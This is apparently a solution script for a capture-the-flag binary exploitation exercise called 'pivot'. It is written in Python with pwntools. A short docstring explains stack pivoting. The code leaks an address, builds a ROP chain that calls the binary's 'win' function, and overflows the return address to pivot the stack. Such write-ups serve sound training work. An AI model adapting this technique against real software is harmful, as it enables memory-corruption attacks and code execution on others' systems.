#!/usr/bin/env python3


"""
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
ASLR:       Enabled

Stack pivoting is a technique used in binary exploitation when the overflow in the stack is sufficient to overwrite the return address 
but not large enough to accommodate a complete instruction chain (e.g., a full ROP chain). The pivoting process allows us to redirect the 
stack pointer (rsp) to a memory region where a long instruction chain can be injected and executed.

This program already provides us with an address where we can redirect our stack.

The exploit uses two inputs:

1. The first input is used to inject the instruction chain into a writeable memory section or another part of the stack.
2. The second input overflows the return address, altering the rsp to point to the location of the injected instruction chain.
    
"""

from pwn import *

context(os="linux", arch="amd64")

bin = context.binary = ELF("./pivot")

bin_rop = ROP("./pivot")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc_rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)

io = start()

io.recvuntil(b"To - ")

leak = io.recv(9)

real_leak = int(leak, 16)

pop_rdi = bin_rop.find_gadget(["pop rdi", "ret"])[0]

pop_rsi = bin_rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

arg1 = 0xBABECAFE

arg2 = 0xCAFEBABE

payload = (
    pack(0)
    + pack(pop_rdi)
    + pack(arg1)
    + pack(pop_rsi)
    + pack(arg2)
    + pack(0)
    + pack(bin.sym.win)
)

io.sendline(payload)

junk = b"a" * 112

leave = bin_rop.find_gadget(["leave", "ret"])[0]

payload = junk + pack(real_leak) + pack(leave)

io.sendline(payload)

io.interactive()
